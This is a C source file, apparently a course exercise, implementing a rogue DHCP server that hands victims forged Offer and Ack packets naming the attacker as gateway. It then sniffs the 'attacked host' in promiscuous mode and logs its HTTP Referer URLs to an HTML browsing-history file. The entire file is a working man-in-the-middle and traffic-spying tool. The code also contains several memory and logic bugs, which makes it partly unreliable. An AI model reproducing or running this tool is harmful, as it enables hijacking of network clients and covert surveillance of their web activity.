#include<netinet/in.h>
#include<errno.h>
#include<netdb.h>
#include<stdio.h> //For standard things
#include<stdlib.h>    //malloc
#include<string.h>    //strlen
 
#include<netinet/ip_icmp.h>   //Provides declarations for icmp header
#include<netinet/udp.h>   //Provides declarations for udp header
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include<netinet/ip.h>    //Provides declarations for ip header
#include<netinet/if_ether.h>  //For ETH_P_ALL
#include<net/ethernet.h> 
#include <linux/if_packet.h> //For ether_header
#include<sys/socket.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<sys/time.h>
#include<sys/types.h>
#include<unistd.h> 
#include <net/if.h>
#include "dhcp.h"
#include <pthread.h> //Provides declarations for DHCP Header

#include <time.h>
#include <unistd.h>

#include <netinet/ether.h> //header ethernet
#include <netinet/in.h> //definicao de protocolos
#include <netinet/in_systm.h> //tipos de dados
#define true 1
#define false 0

/*----SNIFFER FUNCTIONS----------*/
void tokenize(char* linne);
void ProcessPacket(unsigned char* , int);
void Make_header();
void Make_footer();
void print_ip_header(unsigned char* , int);
void print_tcp_packet(unsigned char * , int );
void print_udp_packet(unsigned char * , int );
void print_icmp_packet(unsigned char* , int );
void PrintData (unsigned char* , int);

void * sniffer_main();

FILE *fp;
struct sockaddr_in source,dest;
int tcp=0,udp=0,igmp=0,total=0,others=0,i,j;

struct ifreq ifr;

unsigned char *ip;
unsigned char *ip_name;

/*-------------------------------*/

char interface_name[IFNAMSIZ];
int sniffer_time;
char* tokenize2(char*);

/*----------SERVER FUNCTIONS--------------*/
unsigned char buff[342]; //buff de envio
unsigned char recv_buff[400]; //buff de recepcao

void get_server_mac();
void get_server_ip_char();
void split_ip();

char* ip_source; //VIA TERMINAL 
const char bcast[] = "255.255.255.255";
char* ip_aux;
char* ip_aux_split;
char* ip_dest;
uint8_t* mac;
uint8_t* mac_dest;
int discover_flag = 0;
int ack_flag = 0;
uint8_t ip_part1, ip_part2, ip_part3, ip_part4;
/*----------------------
--------------------*/

unsigned short in_cksum(unsigned short *addr,int len)
{
        register int sum = 0;
        u_short answer = 0;
        register u_short *w = addr;
        register int nleft = len;

        /*
         * Our algorithm is simple, using a 32 bit accumulator (sum), we add
         * sequential 16 bit words to it, and at the end, fold back all the
         * carry bits from the top 16 bits into the lower 16 bits.
         */
        while (nleft > 1)  {
                sum += *w++;
                nleft -= 2;
        }

        /* mop up an odd byte, if necessary */
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w ;
                sum += answer;
        }

        /* add back carry outs from top 16 bits to low 16 bits */
        sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;                          /* truncate to 16 bits */
        return(answer);
}


void get_client_ip(){
	
   ip_dest = malloc(sizeof(ip_aux));
   char* var = strtok(ip_aux, ".");
   sprintf(ip_dest+strlen(ip_dest),"%s.",var);
   var = strtok(NULL, ".");
   sprintf(ip_dest+strlen(ip_dest),"%s.",var);
   var = strtok(NULL, ".");
   sprintf(ip_dest+strlen(ip_dest),"%s.",var);
   var = strtok(NULL, ".");
   srand(time(NULL));
   sprintf(ip_dest+strlen(ip_dest),"%d",10+rand()%99);

}

void split_ip(){
	
   char aux[3], aux1[3], aux2[3], aux3[3];
    strcpy(aux, strtok(&ip_aux_split , "."));
    strcpy(aux1, strtok(NULL, "."));
    strcpy(aux2 , strtok(NULL, "."));
    strcpy(aux3, strtok(NULL, "."));

	ip_part1 = atoi(aux);
	ip_part2 = atoi(aux1);
	ip_part3 = atoi(aux2);
	ip_part4 = atoi(aux3);

}


void build_offer_packet()
{


	mac_dest = malloc(6);
	struct ether_header *eth = (struct ether_header *) &buff[0];
	struct ether_header *rcv_eth = (struct ether_header *) &recv_buff[0];

	
	mac_dest[0] = rcv_eth->ether_shost[0];
	mac_dest[1] = rcv_eth->ether_shost[1];
	mac_dest[2] = rcv_eth->ether_shost[2];
	mac_dest[3] = rcv_eth->ether_shost[3];
	mac_dest[4] = rcv_eth->ether_shost[4];
	mac_dest[5] = rcv_eth->ether_shost[5];

	
	eth->ether_dhost[0] = mac_dest[0];
	eth->ether_dhost[1] = mac_dest[1];
	eth->ether_dhost[2] = mac_dest[2];
	eth->ether_dhost[3] = mac_dest[3];
	eth->ether_dhost[4] = mac_dest[4];
	eth->ether_dhost[5] = mac_dest[5];	


	eth->ether_shost[0] = mac[0]; 
	eth->ether_shost[1] = mac[1];
	eth->ether_shost[2] = mac[2];
	eth->ether_shost[3] = mac[3];
	eth->ether_shost[4] = mac[4];
	eth->ether_shost[5] = mac[5];

	//IPv4
	eth->ether_type = htons(0X800);

 	struct iphdr *ip = (struct iphdr*) &buff[14];
	
	//Buffer auxiliar para calculo do Checksum    
	unsigned char buff_ip[20];
	   
 	int length = 328;
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
    ip->tot_len = htons(length);
	ip->id = htons(57005); //0XDEAD
	ip->frag_off = 0;
    ip->ttl = 0X10;
    ip->protocol = 0X11;	
	ip->check = 0;
	inet_aton(&ip_source, &ip->saddr);
    inet_aton(bcast, &ip->daddr);
	memcpy(buff_ip, &buff[14], 20);
	ip->check = in_cksum((unsigned short*) &buff_ip, 20);

    struct udphdr *udp = (struct udphdr*)&buff[34];

    udp->source = htons(0X43);
    udp->dest = htons(0X44);
   	udp->len = htons(0X134);
    udp->check = 0;

    struct dhcp_message *dhcp = (struct dhcp_message*)&buff[42];
	struct dhcp_message *recv_dhcp = (struct dhcp_message*)&recv_buff[42];
    
    dhcp->op = 2; 
    dhcp->htype = 1; 
    dhcp->hlen = 6; 
    dhcp->hops = 0; 
    dhcp->xid = recv_dhcp->xid;
    dhcp->secs = 0;
    dhcp->flags = 0;
	dhcp->ciaddr = 0;
	inet_aton(ip_dest, &dhcp->yiaddr);
	inet_aton(&ip_source, &dhcp->siaddr);
    dhcp->ciaddr = 0;
    dhcp->chaddr[0] = mac_dest[0];
    dhcp->chaddr[1] = mac_dest[1];
    dhcp->chaddr[2] = mac_dest[2]; 
    dhcp->chaddr[3] = mac_dest[3];
    dhcp->chaddr[4] = mac_dest[4];
    dhcp->chaddr[5] = mac_dest[5];
    dhcp->options[0] = 0X63;
    dhcp->options[1] = 0X82;
    dhcp->options[2] = 0X53;
	dhcp->options[3] = 0X63;
	dhcp->options[4] = 0X35;
	dhcp->options[5] = 1;
	dhcp->options[6] = 2; //OFFER
    dhcp->options[7] = 1;
    dhcp->options[8] = 4;
    dhcp->options[9] = 0XFF;
    dhcp->options[10] = 0XFF;
    dhcp->options[11] = 0XFF;
	dhcp->options[12] = 0;
	dhcp->options[13] = 2;
	dhcp->options[14] = 4;
    dhcp->options[15] = 0;
    dhcp->options[16] = 0;
	dhcp->options[17] = 0;
	dhcp->options[18] = 0;
	dhcp->options[19] = 3;
	dhcp->options[20] = 4;
	//Gateway
	dhcp->options[21] = ip_part1; 
	dhcp->options[22] = ip_part2;
	dhcp->options[23] = ip_part3;
	dhcp->options[24] = ip_part4;
	dhcp->options[25] = 0X17;
	dhcp->options[26] = 1;
	dhcp->options[27] = 0X40;
	dhcp->options[28] = 0X33;
	dhcp->options[29] = 4;
	dhcp->options[30] = 0;
	dhcp->options[31] = 0;
	dhcp->options[32] = 0X0E;
	dhcp->options[33] = 0X10;
	dhcp->options[34] = 0X36;
	dhcp->options[35] = 0X04;
	dhcp->options[36] = ip_part1;
	dhcp->options[37] = ip_part2;
	dhcp->options[38] = ip_part3;
	dhcp->options[39] = ip_part4;
	dhcp->options[40] = 6;
	dhcp->options[41] = 8;
	//DNS Addresses	
	dhcp->options[42] = 0X08;
	dhcp->options[43] = 0X08;
	dhcp->options[44] = 0X08;
	dhcp->options[45] = 0X08;
	dhcp->options[46] = 0X08;
	dhcp->options[47] = 0X08;
	dhcp->options[48] = 0X04;
	dhcp->options[49] = 0X04;
	dhcp->options[50] = 0X3a;
	dhcp->options[51] = 4;
	dhcp->options[52] = 0;
	dhcp->options[53] = 0;
	dhcp->options[54] = 7;
	dhcp->options[55] = 8;
	dhcp->options[56] = 0X3b;
	dhcp->options[57] = 4;
	dhcp->options[58] = 0;
	dhcp->options[59] = 0;
	dhcp->options[60] = 0X0C;
	dhcp->options[61] = 0X4E;
	dhcp->options[62] = 0XFF;
	dhcp->options[63] = 0;

 }

void build_ack_packet()
{

	
	mac_dest = malloc(6);
	struct ether_header *eth = (struct ether_header *) &buff[0];
	struct ether_header *rcv_eth = (struct ether_header *) &recv_buff[0];

	
	mac_dest[0] = rcv_eth->ether_shost[0];
	mac_dest[1] = rcv_eth->ether_shost[1];
	mac_dest[2] = rcv_eth->ether_shost[2];
	mac_dest[3] = rcv_eth->ether_shost[3];
	mac_dest[4] = rcv_eth->ether_shost[4];
	mac_dest[5] = rcv_eth->ether_shost[5];

	
	eth->ether_dhost[0] = mac_dest[0];
	eth->ether_dhost[1] = mac_dest[1];
	eth->ether_dhost[2] = mac_dest[2];
	eth->ether_dhost[3] = mac_dest[3];
	eth->ether_dhost[4] = mac_dest[4];
	eth->ether_dhost[5] = mac_dest[5];	


	eth->ether_shost[0] = mac[0];
	eth->ether_shost[1] = mac[1];
	eth->ether_shost[2] = mac[2];
	eth->ether_shost[3] = mac[3];
	eth->ether_shost[4] = mac[4];
	eth->ether_shost[5] = mac[5];

	//IPv4
	eth->ether_type = htons(0X800);

 	struct iphdr *ip = (struct iphdr*) &buff[14];
    unsigned char buff_ip[20];
	  
 	int length = 328;
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
    ip->tot_len = htons(length);
	ip->id = htons(57005); //0XDEAD
	ip->frag_off = 0;
    ip->ttl = 0X10;
    ip->protocol = 0X11;	
	ip->check = 0;
	inet_aton(&ip_source, &ip->saddr);
    inet_aton(bcast, &ip->daddr);
	memcpy(buff_ip, &buff[14], 20);
	ip->check = in_cksum((unsigned short*) &buff_ip, 20);

    struct udphdr *udp = (struct udphdr*)&buff[34];

    udp->source = htons(0X43);
    udp->dest = htons(0X44);
   	udp->len = htons(0X134);
    udp->check = 0;

    struct dhcp_message *dhcp = (struct dhcp_message*)&buff[42];
	struct dhcp_message *recv_dhcp = (struct dhcp_message*)&recv_buff[42];
    
    dhcp->op = 2; 
    dhcp->htype = 1; 
    dhcp->hlen = 6; 
    dhcp->hops = 0; 
    dhcp->xid = recv_dhcp->xid;
    dhcp->secs = 0;
    dhcp->flags = 0;
	dhcp->ciaddr = 0;
	inet_aton(ip_dest, &dhcp->yiaddr);
	inet_aton(&ip_source, &dhcp->siaddr);
    dhcp->ciaddr = 0;
    dhcp->chaddr[0] = mac_dest[0];
    dhcp->chaddr[1] = mac_dest[1];
    dhcp->chaddr[2] = mac_dest[2]; 
    dhcp->chaddr[3] = mac_dest[3];
    dhcp->chaddr[4] = mac_dest[4];
    dhcp->chaddr[5] = mac_dest[5];
    dhcp->options[0] = 0X63;
    dhcp->options[1] = 0X82;
    dhcp->options[2] = 0X53;
	dhcp->options[3] = 0X63;
	dhcp->options[4] = 0X35;
	dhcp->options[5] = 1;
	dhcp->options[6] = 5; //ACK
    dhcp->options[7] = 1;
    dhcp->options[8] = 4;
    dhcp->options[9] = 0XFF;
    dhcp->options[10] = 0XFF;
    dhcp->options[11] = 0XFF;
	dhcp->options[12] = 0;
	dhcp->options[13] = 2;
	dhcp->options[14] = 4;
    dhcp->options[15] = 0;
    dhcp->options[16] = 0;
	dhcp->options[17] = 0;
	dhcp->options[18] = 0;
	dhcp->options[19] = 3;
	dhcp->options[20] = 4;
	//Gateway
	dhcp->options[21] = ip_part1; 
	dhcp->options[22] = ip_part2;
	dhcp->options[23] = ip_part3;
	dhcp->options[24] = ip_part4;
	//End Gateway
	dhcp->options[25] = 0X17;
	dhcp->options[26] = 1;
	dhcp->options[27] = 0X40;
	dhcp->options[28] = 0X33;
	dhcp->options[29] = 4;
	dhcp->options[30] = 0;
	dhcp->options[31] = 0;
	dhcp->options[32] = 0X0E;
	dhcp->options[33] = 0X10;
	dhcp->options[34] = 0X36;
	dhcp->options[35] = 0X04;
	//server identifier
	dhcp->options[36] = ip_part1;
	dhcp->options[37] = ip_part2;
	dhcp->options[38] = ip_part3;
	dhcp->options[39] = ip_part4;
	//end - svr identifier
	dhcp->options[40] = 6;
	dhcp->options[41] = 8;
	//Google
	dhcp->options[42] = 0X08;
	dhcp->options[43] = 0X08;
	dhcp->options[44] = 0X08;
	dhcp->options[45] = 0X08;
	dhcp->options[46] = 0X08;
	dhcp->options[47] = 0X08;
	dhcp->options[48] = 0X04;
	dhcp->options[49] = 0X04;
	dhcp->options[50] = 0X3a;
	dhcp->options[51] = 4;
	dhcp->options[52] = 0;
	dhcp->options[53] = 0;
	dhcp->options[54] = 7;
	dhcp->options[55] = 8;
	dhcp->options[56] = 0X3b;
	dhcp->options[57] = 4;
	dhcp->options[58] = 0;
	dhcp->options[59] = 0;
	dhcp->options[60] = 0X0C;
	dhcp->options[61] = 0X4E;
	dhcp->options[62] = 0XFF;
	dhcp->options[63] = 0;

}


 
int main (int argc,char *argv[])
{


	if (argc != 4) {
  		printf("Usage: %s interface tempo-de-execucao-sniffer ip-server\n", argv[0]);
  		return 1;
  	}
  	strcpy(interface_name, argv[1]);
	sniffer_time = atoi(argv[2]);
	strcpy(&ip_source, argv[3]);
	
	//Sniffer thread
	pthread_t tid;

	get_server_ip_char(); 
	split_ip();
	get_client_ip();

	get_server_mac();

	int sock, i;
	struct ifreq ifr;
	struct sockaddr_ll to;
	socklen_t len;
	unsigned char addr[6];

	if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)  {
		printf("Erro na criacao do socket.\n");
        exit(1);
 	}

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interface_name, IFNAMSIZ-1);
	if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0)
		perror("SIOCGIFINDEX");	

	to.sll_protocol = htons(ETH_P_ALL);
	to.sll_ifindex = ifr.ifr_ifindex;
	to.sll_halen = 6;

	len = sizeof(struct sockaddr_ll);

	while(1){

		recv(sock,(char*) &recv_buff, sizeof(recv_buff), 0x0);
		struct iphdr *r_ip = (struct iphdr *) &recv_buff[14];

		if(r_ip->protocol == 17 /*UDP*/){
			struct udphdr *r_udp = (struct udphdr*)&recv_buff[34];
			if(ntohs(r_udp->dest) == 67 && ntohs(r_udp->source) == 68 /*DHCP*/){
				struct dhcp_message *r_dhcp = (struct dhcp_message*)&recv_buff[42];
				if(r_dhcp->options[6] == 1 /*Discover*/){
					printf("Discover detectado... \n");
					build_offer_packet();
					addr[0]=mac_dest[0];
					addr[1]=mac_dest[1];
					addr[2]=mac_dest[2];
					addr[3]=mac_dest[3];
					addr[4]=mac_dest[4];
					addr[5]=mac_dest[5];
					memcpy (to.sll_addr, addr, 6);
					if(sendto(sock, (char *) buff, sizeof(buff), 0, (struct sockaddr*) &to, len)<0)
						printf("sendto maquina destino.\n");
					discover_flag = 1;
					printf("Offer enviado...\n");
				}
				else if(discover_flag = 1 && r_dhcp->options[6] == 3 /*Request*/){
					printf("Request detectado... \n");
					build_ack_packet();
					if(sendto(sock, (char *) buff, sizeof(buff), 0, (struct sockaddr*) &to, len)<0)
						printf("sendto maquina destino.\n");
					ack_flag = 1;
					printf("Ack enviado... \n");                         
				}		
			}
		}
		if(discover_flag == 1 && ack_flag == 1){
			printf("IP atribuído e conexão estabelecida! \n");
			break;
		}	
	}
  
   printf("Sniffando pacotes HTTP do host atacado por %d segundos... \n", sniffer_time);
   if(pthread_create(&tid, NULL, sniffer_main, NULL) != 0){
   		printf("Erro ao criar a thread.\n");
		exit(-1);
   }

   pthread_join(tid, NULL);
	
	
   return 0;
}

void get_server_ip_char()
{
   int fd;
   struct ifreq ifr;
   fd = socket(AF_INET, SOCK_DGRAM, 0);
   ifr.ifr_addr.sa_family = AF_INET; 
   strncpy(ifr.ifr_name, interface_name, IFNAMSIZ-1);
   ioctl(fd, SIOCGIFADDR, &ifr);
   ip_aux = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
   strcpy(&ip_aux_split, ip_aux);
   close(fd);
}



void get_server_mac()
{
   int fd;
   struct ifreq ifr;
   fd = socket(AF_INET, SOCK_DGRAM, 0);
   ifr.ifr_addr.sa_family = AF_INET;
   strncpy(ifr.ifr_name, interface_name, IFNAMSIZ-1);
   ioctl(fd, SIOCGIFHWADDR, &ifr);
   mac = malloc(6);
   mac[0] = ((uint8_t *)&ifr.ifr_hwaddr.sa_data)[0];
   mac[1] = ((uint8_t *)&ifr.ifr_hwaddr.sa_data)[1];
   mac[2] = ((uint8_t *)&ifr.ifr_hwaddr.sa_data)[2];
   mac[3] = ((uint8_t *)&ifr.ifr_hwaddr.sa_data)[3];
   mac[4] = ((uint8_t *)&ifr.ifr_hwaddr.sa_data)[4];
   mac[5] = ((uint8_t *)&ifr.ifr_hwaddr.sa_data)[5];
   close(fd);
}

/*------------SNIFFER CODE-----------------------------------------------------------------------*/

void * sniffer_main()
{
    int saddr_size , data_size;
    struct sockaddr saddr;

    unsigned char *buffer = (unsigned char *) malloc(65536); //Its Big!

    fp=fopen("out.html","w");
    if(fp==NULL)
    {
        printf("Unable to create out.html file.");
    }

    int sock_raw = socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL)) ;

    if(sock_raw < 0)
    {
        //Print the error with proper message
        perror("Socket Error");
    }

    // O procedimento abaixo eh utilizado para "setar" a interface em modo promiscuo
  	strcpy(ifr.ifr_name, interface_name);
  	if(ioctl(sock_raw, SIOCGIFINDEX, &ifr) < 0)
  		printf("erro no ioctl!");
  	ioctl(sock_raw, SIOCGIFFLAGS, &ifr);
  	ifr.ifr_flags |= IFF_PROMISC;
  	ioctl(sock_raw, SIOCSIFFLAGS, &ifr);

    /*Define variáveis para controle do tempo */
  	time_t espera;
  	time_t start = time(NULL);
  	time_t seconds = sniffer_time;
  	espera = start + seconds;

    Make_header();
    while (start < espera) {
        saddr_size = sizeof saddr;
        //Receive a packet
        data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , (socklen_t*)&saddr_size);
        if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
        }
        //Now process the packet
        ProcessPacket(buffer , data_size);
    		start = time(NULL);
    }
    Make_footer();
    close(sock_raw);
    printf("Concluído! Arquivo .html gerado no diretório destino. \n");
}

void ProcessPacket(unsigned char* buffer, int size)
{
    struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    ++total;
    struct dhcp_message * dhcp_ack = (struct dhcp_message*)&buff[42];
    if(iph->saddr == dhcp_ack->yiaddr){	//Verifica se IP do HTTP enviado é igual ao IP atribuído
    	switch (iph->protocol) 
    	{
        	case 6:  //TCP Protocol
          	  ++tcp;
              	  print_tcp_packet(buffer , size);
            	break;

        	case 17: //UDP Protocol
            	  ++udp;
            	  print_udp_packet(buffer , size);
            	break;

        	default:
            	  ++others;
            	break;
    	} 
    }
   // printf("TCP : %d   UDP : %d  Others : %d   Total : %d\r", tcp , udp , others , total);
}

void print_ethernet_header(unsigned char* Buffer, int Size)
{
    struct ethhdr *eth = (struct ethhdr *)Buffer;

    fprintf(fp , "\n");
    fprintf(fp , "Ethernet Header\n");
    fprintf(fp , "   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5] );
    fprintf(fp , "   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4] , eth->h_source[5] );
    fprintf(fp , "   |-Protocol            : %u \n",(unsigned short)eth->h_proto);
}

void print_ip_header(unsigned char* Buffer, int Size)
{

    unsigned short iphdrlen;

    struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr) );
    iphdrlen =iph->ihl*4;

    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr;

    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;

    fprintf(fp, " - %s", inet_ntoa(source.sin_addr));

}

void print_tcp_packet(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;

    struct iphdr *iph = (struct iphdr *)( Buffer  + sizeof(struct ethhdr) );
    iphdrlen = iph->ihl*4;

   
    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));

    int header_size =  sizeof(struct ethhdr) + iphdrlen + tcph->doff*4;

    unsigned char* dataPayload = Buffer + header_size;
	  unsigned char *dataTextPayload = malloc(60000);
	//tcp packet
    int i , j;
    for(i=0 ; i < (Size - header_size) ; i++)
    {
        if( i!=0 && i%16==0)   
        {
            for(j=i-16 ; j<i ; j++)
            {
                if(dataPayload[j]>=32 && dataPayload[j]<=128)
                    sprintf(dataTextPayload + strlen(dataTextPayload) , "%c",(unsigned char)dataPayload[j]); //if its a number or alphabet
                else if(dataPayload[j]==13)
                    sprintf(dataTextPayload + strlen(dataTextPayload) , "\r");
                else if(dataPayload[j]==10)
                    sprintf(dataTextPayload + strlen(dataTextPayload) , "\n");
                else sprintf(dataTextPayload + strlen(dataTextPayload) , ".");
            }
        }
    }
   
    if((strstr(dataTextPayload, "Referer:") != NULL) && ntohs(tcph->dest) == 80){
      fprintf(fp, "\n<li>");

      time_t t = time(NULL);
      struct tm tm = *localtime(&t);

      fprintf(fp, "%d-%d-%d %d:%d:%d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

      print_ip_header(Buffer,Size);
      fprintf(fp, " (Example-PC) ");
      fprintf(fp, "<a href = \"");
      tokenize(dataTextPayload);
      fprintf(fp, "</a></li>");


      memset(dataPayload,0,strlen(dataPayload));
      memset(dataTextPayload,0,strlen(dataTextPayload));
    }
}

void print_udp_packet(unsigned char *Buffer , int Size)
{

    unsigned short iphdrlen;

    struct iphdr *iph = (struct iphdr *)(Buffer +  sizeof(struct ethhdr));
    iphdrlen = iph->ihl*4;

    struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen  + sizeof(struct ethhdr));

    int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof udph;

    if(ntohs(udph->source) == 53)
      print_ip_header(Buffer,Size);
}

void PrintData (unsigned char* data , int Size)
{
    int i , j;
    for(i=0 ; i < Size ; i++)
    {
        if( i!=0 && i%16==0)   
        {
            fprintf(fp , "         ");
            for(j=i-16 ; j<i ; j++)
            {
                if(data[j]>=32 && data[j]<=128)
                    fprintf(fp , "%c",(unsigned char)data[j]); 

                else fprintf(fp , "."); 
            }
            fprintf(fp , "\n");
        }

        if(i%16==0) fprintf(fp , "   ");
            fprintf(fp , " %02X",(unsigned int)data[i]);

        if( i==Size-1)  
        {
            for(j=0;j<15-i%16;j++)
            {
              fprintf(fp , "   "); 
            }

            fprintf(fp , "         ");

            for(j=i-i%16 ; j<=i ; j++)
            {
                if(data[j]>=32 && data[j]<=128)
                {
                  fprintf(fp , "%c",(unsigned char)data[j]);
                }
                else
                {
                  fprintf(fp , ".");
                }
            }

            fprintf(fp ,  "\n" );
        }
    }
}

void Make_header(){
	fprintf(fp, "<html>\n");
  	fprintf(fp, "<header>\n");
	fprintf(fp, "<title>Historico de Navegacao</title>\n");
	fprintf(fp, "</header>\n");
	fprintf(fp, "<body>\n");
	fprintf(fp, "<ul>\n");
}

void Make_footer(){
	fprintf(fp, "\n</ul>\n");
	fprintf(fp, "</body>\n");
	fprintf(fp, "</html>\n");
}

void tokenize(char* line)
{
   char* cmd = strtok(line,"\n");

   while(cmd != NULL){
     if(strstr(cmd, "Referer: ") != NULL){
      fprintf(fp, "%s\">%s", cmd+9, cmd+9);
      break;
     }
   cmd = strtok(NULL, "\n");
   }

}

